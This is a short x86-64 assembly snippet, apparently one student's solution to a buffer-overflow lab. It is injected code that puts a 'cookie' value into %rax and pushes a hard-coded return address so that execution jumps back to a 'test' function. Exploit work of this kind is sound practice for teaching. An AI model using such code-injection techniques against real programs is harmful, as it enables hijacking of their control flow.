movq $0x4d79ae8c49bfa368, %rax #put cookie into rax
pushq $0x400ef3 #ret addr to test
retq    #ret to test with new rax